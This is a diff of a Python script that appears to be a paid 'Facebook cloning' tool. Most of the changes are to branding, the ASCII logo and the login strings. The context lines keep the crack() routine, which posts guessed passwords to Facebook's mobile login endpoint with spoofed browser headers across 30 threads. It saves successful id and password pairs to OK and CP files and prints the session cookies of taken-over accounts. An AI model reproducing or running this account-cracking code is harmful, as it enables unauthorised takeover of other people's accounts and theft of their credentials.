@@ -1,5 +1,5 @@
 #os.system("pkg install espeak")
-#-----------------[ BISHESH]-------------------#
+#-----------------[ BISHESH ]-------------------#
  
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
@@ -16,7 +16,7 @@ from rich.text import Text as tekz
 from time import localtime as lt
 pretty.install()
 CON=sol()
- #------------------[ BISHESH ]-------------------#
+ #------------------[ BISESH-King ]-------------------#
 import os, platform, time, sys
 print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mChecking Update...? ')
 time.sleep(5)
@@ -204,26 +204,20 @@ attemps = 0
 while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
     password = input(' \033[0;93mEnter Password: ')
-    if username == 'B' and password == '7':
+    if username == 'BISHESH' and password == 'HONII':
         print(' \033[0;92mYou Have Successfully Logged in.')
         break
   
 logo =""" 
-       
-       
-
-██████╗ ██╗███████╗██╗  ██╗███████╗███████╗██╗  ██╗
-██╔══██╗██║██╔════╝██║  ██║██╔════╝██╔════╝██║  ██║
-██████╔╝██║███████╗███████║█████╗  ███████╗███████║
-██╔══██╗██║╚════██║██╔══██║██╔══╝  ╚════██║██╔══██║
-██████╔╝██║███████║██║  ██║███████╗███████║██║  ██║
-╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝.               V2.0
-                                                   
-
-                                    
-                                    
-
-
+          
+ 
+ \033[1;92m      ██████╗ ██╗███████╗██╗  ██╗███████╗███████╗██╗  ██╗
+ \033[1;92m      ██╔══██╗██║██╔════╝██║  ██║██╔════╝██╔════╝██║  ██║
+ \033[1;92m      ██████╔╝██║███████╗███████║█████╗  ███████╗███████║
+ \033[1;92m      ██╔══██╗██║╚════██║██╔══██║██╔══╝  ╚════██║██╔══██║
+ \033[1;92m      ██████╔╝██║███████║██║  ██║███████╗███████║██║  ██║
+ \033[1;92m      ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
+                                             
                                          
                                                             
 
@@ -233,12 +227,12 @@ logo ="""
    ║\33[0;41m        [ WORKING WIFI & MOBILE DATA ]       \033[0;92m║
    ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
    \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-   ║    Author                   • \33[1;38mSM-BISHESH ]\33[1;38m    ║\033[1;31m 
-   ║    Facebook                 • BISHesh Xettri ]  ║  \033[1;97m  
+   ║    Author                   • \33[1;38mSM-BISESH ]\33[1;38m    ║\033[1;31m 
+   ║    Facebook                 • BISESH XETTRI]  ║  \033[1;97m  
    ║    Github                   • \33[1;38mBISESH-BRAND ]  ║\33[1;34m   
-   ║    Whatsapp                 • 9808134286] ║\33[1;35m 
+   ║    Whatsapp                 • 97********] ║\33[1;35m 
    ║    TOOLS                    • PAID ]        ║ \33[1;32m   
-   ║    VERSION                  • 2.1 ]         ║\033[1;35m 
+   ║    VERSION                  • 1 ]         ║\033[1;35m 
    \033[1;97m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
 os.system('clear')
 print(logo)
@@ -551,7 +545,7 @@ def setting():
     print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-    #os.system("xdg-open https://www.facebook.com/bishesh.xettri")
+    #os.system("xdg-open https://www.facebook.com/BISESH.khadka.587")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
@@ -571,7 +565,7 @@ def passwrd():
     print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
     print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
     print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
-    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92जय बिशेष भन स्पीड अप को लागी')
+    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY BISESH VAN Speed Up KO LAAGI')
     print('\033[0;97m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -663,7 +657,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;94m[FUCK YOU] {idf} • {pw}')
+                print(f'\r\033[0;94m[BISESH-Cp] {idf} • {pw}')
                 os.system('espeak -a 300 " Cp,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -673,7 +667,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;92m[CONGRATULATIONS💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+                print(f'\r\033[0;92m[LADOO KHA |OK💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " BISESH,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
